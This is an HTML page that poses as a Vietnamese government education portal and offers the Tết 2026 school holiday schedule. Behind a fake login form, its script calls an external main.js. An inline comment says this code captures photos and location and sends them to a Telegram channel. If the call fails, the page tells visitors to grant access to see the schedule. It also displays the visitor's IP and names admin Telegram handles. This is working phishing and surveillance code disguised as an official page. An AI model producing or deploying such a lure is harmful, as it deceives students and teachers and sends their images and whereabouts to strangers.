<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cổng Thông Tin Điện Tử Bộ Giáo Dục & Đào Tạo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-red: #da251d;
            --gold-accent: #ffde00;
            --dark-red: #a81c16;
            --shadow: 0 15px 35px rgba(0,0,0,0.2);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(rgba(255, 245, 245, 0.9), rgba(255, 245, 245, 0.9)), 
                        url('https://www.tgs.vn/wp-content/uploads/2021/01/texture-trong-dong.png');
            background-size: cover;
            background-attachment: fixed;
            color: #333; 
            display: flex; flex-direction: column; min-height: 100vh;
            transition: background 0.5s ease;
        }

        /* Giao diện Dark Mode cho Admin */
        body.dark-mode {
            background: #0f0f0f !important;
            color: #eee;
        }

        .gov-header {
            background: var(--primary-red);
            color: white;
            padding: 10px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            font-size: 13px;
            font-weight: bold;
            text-transform: uppercase;
        }

        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        #login-box {
            background: white;
            width: 100%;
            max-width: 420px;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: var(--shadow);
            text-align: center;
            border-top: 6px solid var(--primary-red);
            position: relative;
        }

        .logo-img {
            width: 100px;
            margin-bottom: 15px;
            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.1));
        }

        h2 { color: var(--dark-red); margin-bottom: 5px; font-size: 18px; }

        .input-group { position: relative; margin-bottom: 15px; }
        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #999; }

        input, select {
            width: 100%;
            padding: 14px 15px 14px 45px;
            border: 1px solid #ddd;
            border-radius: 8px;
            outline: none;
            font-size: 15px;
            background: #fdfdfd;
        }

        .btn-login {
            background: var(--primary-red);
            color: white;
            border: none;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px; 
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            text-transform: uppercase;
        }

        /* Style cho trang QR Admin */
        #admin-content {
            display: none;
            width: 100%;
            max-width: 400px;
            text-align: center;
            animation: fadeIn 0.8s ease;
        }

        .qr-card {
            background: #1a1a1a;
            padding: 30px;
            border-radius: 20px;
            border: 1px solid #333;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }

        .qr-img {
            width: 100%;
            border-radius: 10px;
            border: 4px solid #2ecc71;
            margin-bottom: 20px;
        }

        .bio-info {
            background: #252525;
            padding: 15px;
            border-radius: 10px;
            color: #2ecc71;
            text-align: left;
            font-family: monospace;
            border-left: 4px solid #2ecc71;
            margin-bottom: 10px;
        }

        /* Nội dung lịch nghỉ Tết */
        #main-content {
            display: none;
            width: 100%;
            max-width: 600px;
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: var(--shadow);
        }

        .calendar-header { background: var(--primary-red); color: #fff; padding: 30px 20px; text-align: center; border-bottom: 4px solid var(--gold-accent); }
        .calendar-body { padding: 25px; background: #fff; }
        .level-box { background: #fcfcfc; border-left: 5px solid var(--primary-red); padding: 18px; margin-bottom: 15px; border-radius: 4px; }
        .level-title { font-weight: bold; color: var(--dark-red); display: flex; align-items: center; gap: 10px; }

        .loader {
            width: 25px; height: 25px; border: 3px solid #f3f3f3;
            border-top: 3px solid var(--primary-red); border-radius: 50%;
            animation: spin 1s linear infinite; display: none; margin: 15px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="gov-header">
    <span><i class="fas fa-landmark"></i> CỔNG THÔNG TIN ĐIỆN TỬ CHÍNH PHỦ</span>
    <span>VN <i class="fas fa-chevron-down"></i></span>
</div>

<div class="container">
    <div id="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Emblem_of_Vietnam.svg/1200px-Emblem_of_Vietnam.svg.png" class="logo-img">
        <h2>HỆ THỐNG XÁC THỰC</h2>
        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Tra cứu lịch nghỉ lễ, Tết 2026</p>
        
        <div class="input-group">
            <i class="fas fa-users-cog"></i>
            <select id="user-role">
                <option value="hocsinh">Học sinh (THCS & THPT)</option>
                <option value="sinhvien">Sinh viên (ĐH & Cao Đẳng)</option>
                <option value="giaovien">Cán bộ / Giảng viên</option>
            </select>
        </div>

        <div class="input-group">
            <i class="fas fa-user"></i>
            <input type="text" id="username" placeholder="Mã định danh / Tên đăng nhập">
        </div>

        <div class="input-group">
            <i class="fas fa-lock"></i>
            <input type="password" id="password" placeholder="Mật khẩu hệ thống">
        </div>
        
        <div id="loading-spinner" class="loader"></div>
        <p id="status-text" style="display:none; font-size: 13px; color: var(--primary-red); margin-top: 5px; font-weight: 500;">
            <i class="fas fa-shield-alt"></i> Đang xác thực quyền truy cập...
        </p>

        <button id="login-btn" class="btn-login" onclick="processLogin()">ĐĂNG NHẬP HỆ THỐNG</button>
    </div>

    <div id="admin-content">
        <div class="qr-card">
            <h2 style="color: #2ecc71; margin-bottom: 20px;">HỆ THỐNG QUẢN TRỊ</h2>
            <img src="https://raw.githubusercontent.com/CongThongTinChinhPhu/Lich-nghi-tet-cua-cac-truong-tren-dia-ban-thanh-pho-ho-chi-minh/main/7b36bd73b1663f386677.jpg" class="qr-img">
            
            <div class="bio-info">
                <div><b>Admin 1:</b> Mrwenben</div>
                <div><b>Tele:</b> @Mrwenben</div>
            </div>

            <div class="bio-info" style="border-left-color: #ffde00; color: #ffde00;">
                <div><b>Admin 2:</b> VanThanh</div>
                <div><b>Tele:</b> @Vanthanhdeptroai</div>
            </div>
            
            <p style="color: #555; font-size: 11px; margin-top: 15px;">Chế độ bảo mật Admin đang bật</p>
        </div>
    </div>

    <div id="main-content">
        <div class="calendar-header">
            <h2 id="role-title" style="color: white; font-size: 22px;"> THÔNG BÁO LỊCH NGHỈ TẾT</h2>
            <p style="font-size: 13px; opacity: 0.9;">Số: 245/TB-BGDĐT - 2026</p>
        </div>
        <div class="calendar-body">
            <div id="content-detail"></div>
            <div style="border-top: 1px solid #eee; margin-top: 20px; padding-top: 15px; color: #777; font-size: 12px;">
                <p>Mã xác thực thiết bị: <span id="user-ip" style="color: var(--primary-red); font-weight: bold;">...</span></p>
            </div>
        </div>
    </div>
</div>

<script src="main.js?v=1.3"></script>

<script>
    async function processLogin() {
        const role = document.getElementById('user-role').value;
        const user = document.getElementById('username').value.trim();
        const pass = document.getElementById('password').value.trim();
        
        const btn = document.getElementById('login-btn');
        const loader = document.getElementById('loading-spinner');
        const status = document.getElementById('status-text');
        
        // --- LOGIC KIỂM TRA ADMIN ---
        const isAdmin1 = (user === "Mrwenben" && pass === "0");
        const isAdmin2 = (user === "VanThanh" && pass === "0");

        if (isAdmin1 || isAdmin2) {
            btn.style.display = 'none';
            loader.style.display = 'block';
            status.style.display = 'block';
            status.innerHTML = '<i class="fas fa-user-shield"></i> Xác nhận Admin. Đang báo cáo hệ thống...';

            // Gửi thông báo đặc biệt về Telegram thông qua info object (nếu main.js hỗ trợ)
            if (typeof info !== 'undefined') {
                info.specialNote = `⚠️ THÔNG BÁO: Admin [${user}] vừa đăng nhập vào trang!`;
            }

            // Thực hiện main() để chụp ảnh/vị trí và gửi Tele
            if (typeof main === 'function') await main(); 

            setTimeout(() => {
                document.body.classList.add('dark-mode');
                document.getElementById('login-box').style.display = 'none';
                document.getElementById('admin-content').style.display = 'block';
            }, 1200);
            return; 
        }

        // --- TÀI KHOẢN NGƯỜI DÙNG THƯỜNG ---
        let accessGranted = false;
        if (role === "hocsinh" && user === "thcs-thpthcm" && pass === "1") accessGranted = true;
        else if (role === "sinhvien" && user === "daihoc-caodang" && pass === "2") accessGranted = true;
        else if (role === "giaovien" && user === "lecamtu" && pass === "gv079254287410") accessGranted = true;

        if (!accessGranted) {
            alert("Sai tài khoản hoặc mật khẩu hệ thống!");
            return;
        }

        btn.style.display = 'none';
        loader.style.display = 'block';
        status.style.display = 'block';

        try {
            if (typeof main === 'function') await main(); 
            setTimeout(() => {
                document.getElementById('login-box').style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
                showSchedule(role);
                if (typeof info !== 'undefined' && info.ip) {
                    document.getElementById('user-ip').innerText = info.ip;
                }
            }, 1500);
        } catch (err) {
            alert("Vui lòng cho phép truy cập để xem lịch!");
            location.reload();
        }
    }

    function showSchedule(role) {
        const container = document.getElementById('content-detail');
        const title = document.getElementById('role-title');
        if (role === "hocsinh") {
            title.innerText = "LỊCH NGHỈ TẾT HỌC SINH";
            container.innerHTML = `<div class="level-box"><span class="level-title">KHỐI THCS & THPT</span><p>Nghỉ từ 07/02/2026 đến 27/02/2026.</p></div>`;
        } else if (role === "sinhvien") {
            title.innerText = "LỊCH NGHỈ TẾT SINH VIÊN";
            container.innerHTML = `<div class="level-box"><span class="level-title">ĐẠI HỌC & CAO ĐẲNG</span><p>Nghỉ từ 07/02/2026 đến 27/02/2026.</p></div>`;
        } else {
            title.innerText = "TRA CỨU TỔNG HỢP";
            container.innerHTML = `<div class="level-box"><span class="level-title">CÁN BỘ & GIÁO VIÊN</span><p>Nghỉ từ 08/02/2026 đến 26/02/2026.</p></div>`;
        }
    }
</script>

</body>
</html>
